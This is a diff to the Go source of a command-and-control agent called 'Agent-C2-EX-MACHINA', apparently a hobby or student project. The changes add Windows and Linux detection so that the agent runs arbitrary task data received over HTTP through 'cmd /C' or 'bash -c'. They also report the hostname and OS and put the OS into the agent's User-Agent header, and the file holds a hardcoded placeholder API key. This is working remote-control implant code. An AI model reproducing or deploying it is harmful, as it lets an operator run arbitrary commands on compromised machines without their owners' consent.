@@ -6,9 +6,21 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"os"
 	"os/exec"
+	"runtime"
 	"time"
 )
+
+func getOS() string {
+	if os := runtime.GOOS; os == "windows" {
+		return "Windows"
+	} else if os == "linux" {
+		return "Linux"
+	} else {
+		return "Unknown"
+	}
+}
 
 /*
    processCommandTask traite les tâches de type commande et retourne le stdout, le stderr et le status de la tâche.
@@ -23,9 +35,41 @@ import (
    - exitCode: le code de sortie de la commande
    - err: une erreur éventuelle rencontrée lors de l'exécution de la commande
 */
+/*func processCommandTask(task map[string]interface{}) (string, string, int, error) {
+	fmt.Println("startProcess")
+	cmd := exec.Command("bash", "-c", task["Data"].(string))
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+	err := cmd.Run()
+	if err != nil {
+		return "", "", cmd.ProcessState.ExitCode(), err
+	}
+	return stdout.String(), stderr.String(), cmd.ProcessState.ExitCode(), nil
+}
+*/
 func processCommandTask(task map[string]interface{}) (string, string, int, error) {
 	fmt.Println("startProcess")
-	cmd := exec.Command("sh", "-c", task["Data"].(string))
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		hostName, err := os.Hostname()
+		if err != nil {
+			panic(err)
+		}
+
+		fmt.Printf("Hostname: %s\n", hostName)
+		fmt.Printf("OS: %s\n", getOS())
+		cmd = exec.Command("cmd", "/C", task["Data"].(string))
+	} else {
+		hostName, err := os.Hostname()
+		if err != nil {
+			panic(err)
+		}
+
+		fmt.Printf("Hostname: %s\n", hostName)
+		fmt.Printf("OS: %s\n", getOS())
+		cmd = exec.Command("bash", "-c", task["Data"].(string))
+	}
 	var stdout, stderr bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
@@ -109,19 +153,19 @@ func processTask(task map[string]interface{}) (string, string, int, error) {
 
 */
 func runAgent() {
-	fmt.Println("Defined variables")
+	fmt.Println("Agent starts")
 	var (
 		taskStdout string
 		taskStderr string
 		taskStatus int
 		content    []byte
 	)
-
+	osType := getOS()
 	client := &http.Client{}
-
+	/*ici appelle de fonction pour detecter l'os utiliser commme ça je pourrais faire un check de l'os sur lequelle l'agent est int*/
 	headers := map[string]string{
 		"Content-Type": "application/json",
-		"User-Agent":   "Agent-C2-EX-MACHINA 0.0.1 (Linux) HP-PC",
+		"User-Agent":   fmt.Sprintf("Agent-C2-EX-MACHINA 0.0.1 (%s)", osType),
 		"Api-Key":      "AdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdmin",
 	}
 
@@ -243,7 +287,7 @@ func main() {
 	██║░░██╗██╔══╝░░╚════╝██╔══╝░░░██╔██╗░╚════╝██║╚██╔╝██║██╔══██║██║░░██╗██╔══██║██║██║╚████║██╔══██║
 	╚█████╔╝███████╗░░░░░░███████╗██╔╝╚██╗░░░░░░██║░╚═╝░██║██║░░██║╚█████╔╝██║░░██║██║██║░╚███║██║░░██║
 	░╚════╝░╚══════╝░░░░░░╚══════╝╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝`)
-	time.Sleep(4 * time.Second)
+	//time.Sleep(4 * time.Second)
 	runAgent()
 }
 
